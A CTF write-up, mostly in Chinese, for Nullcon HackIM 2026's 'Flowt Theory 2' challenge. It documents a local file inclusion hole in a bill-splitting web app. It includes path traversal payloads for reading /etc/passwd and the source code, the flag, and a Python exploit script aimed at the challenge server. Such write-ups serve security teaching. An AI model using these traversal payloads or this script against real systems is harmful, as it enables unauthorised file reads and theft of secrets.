---
title: "Flowt Theory 2 - Nullcon Goa HackIM 2026 CTF"
category: "misc"
subcategory: "lfi"
type: "writeup"
tags: ["misc", "web", "floating-point", "lfi", "flowt", "theory", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: misc/Flowt"
source:
  name: "CTFtime writeup #40568"
  url: "https://ctftime.org/writeup/40568"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Flowt Theory 2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Flowt Theory 2
- **Author team:** 正规子群.AI
- **CTFtime tags:** misc, web, floating-point, lfi
- **CTFtime:** <https://ctftime.org/writeup/40568>

---
## 134 Flowt Theory 2

\- Category: `misc`  
\- Value: `362`  
\- Solves: `47`  
\- Solved by me: `True`  
\- Local directory: `misc/Flowt`

### 题目描述  
> My friends and I built the BillSplitter Lite app to track our expenses and settle debts. It uses some extremely advanced math to make sure everyone pays exactly what they owe...  
> Can you find the hidden administrative fee?  
>  
> Author: Gaugerus

### 连接信息  
\- `52.59.124.14:5070`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# Flowt Theory 解题记录

\---

## 题目信息

\- 题目: Flowt Theory  
\- 类型: Misc / Web  
\- 目标: 获取 `ENO{...}` flag  
\- 远程: `52.59.124.14:5069`

\---

## 初步观察

访问首页后可以看到：

1\. 总金额永远多出 `0.01`。  
2\. 交易名输入框提示词是 `Filename`，并且可通过 `?view_receipt=xxx` 查看“日志文件”。  
3\. 页面提示有“hidden administrative fee of 0.01”。

这说明后端可能把每条记录都写入文件，再按文件内容做求和。

\---

## 漏洞定位

通过目录穿越测试发现 `view_receipt` 参数存在 LFI（本质是任意文件读取）。

例如可读：

\- `?view_receipt=../../../../../etc/passwd`

进一步读取源码：

\- `?view_receipt=../../../../../var/www/html/index.php`

源码关键逻辑：

1\. 每个会话目录会生成一个隐藏文件，内容是：  
\- 第一行 `0.01`  
\- 第二行真实 flag  
2\. 隐藏文件名是随机的，如 `secret_xxxxxxxx`。  
3\. 这个随机文件名会写到同目录下的 `.lock`。  
4\. 页面列出交易时会刻意排除该隐藏文件，因此用户只能看到“多出来 0.01”，看不到 flag。  
5\. 但 `view_receipt` 直接拼接路径读取，没有做路径限制。

数学上，总额是

$\text{Total}=\sum_i a_i + 0.01$

而这个 $0.01$ 正是隐藏文件第一行被 `(float)` 解析后参与求和的结果。

\---

## 利用链

1\. 先请求主页建立会话。  
2\. 读取 `?view_receipt=.lock`，得到随机隐藏文件名 `secret_xxxxxxxx`。  
3\. 再读取 `?view_receipt=secret_xxxxxxxx`，拿到两行内容，第二行即 flag。

\---

## 失败尝试记录

1\. 一开始把 `5069` 当作裸 TCP 服务，直接 `nc` 没有输出；后确认是 HTTP 服务。  
2\. 先尝试直接读 `/flag.txt`，目录层级不够导致失败。  
3\. 后续通过读取 `index.php` 才完整确认了隐藏文件与 `.lock` 的关系，改为稳定两步读取法。

\---

## 解题脚本

脚本位置：`solution/[solution.py](http://solution.py)`

执行：

```bash  
python3 solution/[solution.py](http://solution.py)  
```

\---

## Flag

```text  
ENO{f10a71ng_p01n7_pr3c1510n_15_n07_y0ur_fr13nd}  
```

### Exploit  
#### misc/Flowt/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import html  
import re  
import sys  
import urllib.parse  
import urllib.request  
import http.cookiejar

# BASE_URL = "http://52.59.124.14:5069/"  
BASE_URL = "http://52.59.124.14:5070"

TIMEOUT = 8

def fetch(opener, params=None):  
if params:  
url = BASE_URL + "?" + urllib.parse.urlencode(params)  
else:  
url = BASE_URL  
with opener.open(url, timeout=TIMEOUT) as resp:  
return resp.read().decode("utf-8", errors="replace")

def extract_pre_code(page):  
m = re.search(r"

```
    (.*?)
```

", page, re.S)  
if not m:  
return None  
return html.unescape(m.group(1)).strip() 

def main():  
cj = http.cookiejar.CookieJar()  
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Initialize session directory on remote side.  
fetch(opener)

# LFI #1: read lock file in user dir to get randomized hidden filename.  
lock_page = fetch(opener, {"view_receipt": ".lock"})  
secret_name = extract_pre_code(lock_page)  
if not secret_name or secret_name == "File not found.":  
print("[-] Failed to leak .lock or invalid response")  
sys.exit(1)

# LFI #2: read hidden secret file, second line contains flag.  
secret_page = fetch(opener, {"view_receipt": secret_name})  
m = re.search(r"ENO\\{[^}\n]+\\}", secret_page)  
if not m:  
print("[-] Flag not found")  
sys.exit(1)

print("[+] Secret file:", secret_name)  
print("[+] Flag:", m.group(0))

if __name__ == "__main__":  
main()  
```

\---
